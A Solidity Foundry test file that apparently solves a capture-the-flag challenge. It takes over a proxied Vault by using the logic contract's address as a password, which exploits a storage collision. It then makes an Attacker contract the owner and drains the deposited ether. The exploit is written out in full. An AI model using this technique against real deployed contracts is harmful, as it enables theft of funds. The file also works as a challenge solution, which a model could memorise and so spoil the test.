// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";
import "../src/Attacker.sol";

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // add your hacker code.
        bytes32 _password = bytes32(uint256(uint160(address(logic))));

        Attacker attacker = new Attacker(payable(address(vault)));
        
        VaultLogic newLogic = VaultLogic(address(vault));
        newLogic.changeOwner(_password, address(attacker));

        console.log("attacker address: ", address(attacker));
        console.log("owner: ", vault.owner());
        console.log("attacker: ", attacker.owner());

        attacker.attack{value: 0.1 ether}();
        attacker.attackerWithdraw();

        console.log("player balance: ",palyer.balance);

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }

}
